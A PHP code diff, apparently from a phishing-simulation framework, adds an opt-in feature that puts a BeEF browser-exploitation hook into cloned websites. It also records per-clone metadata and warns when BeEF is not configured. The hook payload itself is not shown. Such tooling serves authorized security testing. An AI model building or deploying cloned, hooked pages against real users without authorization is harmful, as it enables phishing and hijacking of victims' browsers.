@@ -11,6 +11,7 @@
 require_once dirname(__FILE__, 3) . '/config/db.php';
 require_once dirname(__FILE__, 3) . '/manager/session_manager.php';
 require_once dirname(__FILE__, 3) . '/manager/common_functions.php';
+require_once dirname(__FILE__, 3) . '/manager/beef_integration.php';
 require_once dirname(__FILE__, 2) . '/ClonedSite.php';
 
 if (!isSessionValid()) {
@@ -43,6 +44,7 @@ switch ($POSTJ['action_type']) {
 
 function action_clone_site(array $POSTJ): void
 {
+    global $conn;
     $url  = trim((string) ($POSTJ['url'] ?? ''));
     $slug = (string) ($POSTJ['slug'] ?? '');
     if ($url === '' || $slug === '') {
@@ -59,11 +61,34 @@ function action_clone_site(array $POSTJ): void
     if ($opts['tracker_url'] === '') {
         $opts['tracker_url'] = null;
     }
+    // Phase 3.52 task 5: optional BeEF hook injection.
+    // Operator opts in per-clone via the SiteCloner form. We resolve the
+    // snippet here (not in ClonedSite) so the settings lookup stays at
+    // the dispatcher layer; if BeEF isn't configured, we silently drop
+    // the toggle and surface a warning to the JS layer.
+    $beefRequested = !empty($POSTJ['beef_hook_enabled']);
+    $beefActuallyOn = false;
+    if ($beefRequested && isset($conn) && $conn instanceof mysqli) {
+        $bs = beef_settings_load($conn);
+        if ($bs !== null && $bs['base_url'] !== '') {
+            $opts['beef_hook_snippet'] = beef_hook_snippet($bs['base_url']);
+            $beefActuallyOn = $opts['beef_hook_snippet'] !== '';
+        }
+    }
     $cloner = new ClonedSite($url, $slug, $opts);
     $result = $cloner->fetchAndSave();
     if ($result['ok']) {
-        logIt('Site cloned: ' . $result['slug'] . ' from ' . $result['url']);
-        echo json_encode(['result' => 'success'] + $result);
+        // Persist per-clone metadata (toggle + future engagement_id).
+        if (isset($conn) && $conn instanceof mysqli) {
+            taphish_clone_meta_upsert($conn, (string) $result['slug'], $beefActuallyOn);
+        }
+        logIt('Site cloned: ' . $result['slug'] . ' from ' . $result['url']
+            . ($beefActuallyOn ? ' [+BeEF hook]' : ''));
+        $extra = [];
+        if ($beefRequested && !$beefActuallyOn) {
+            $extra['beef_warning'] = 'BeEF hook requested but BeEF settings are not configured — clone written without the hook.';
+        }
+        echo json_encode(['result' => 'success'] + $result + $extra);
     } else {
         echo json_encode(['result' => 'failed', 'error' => $result['error'] ?? 'Unknown error']);
     }
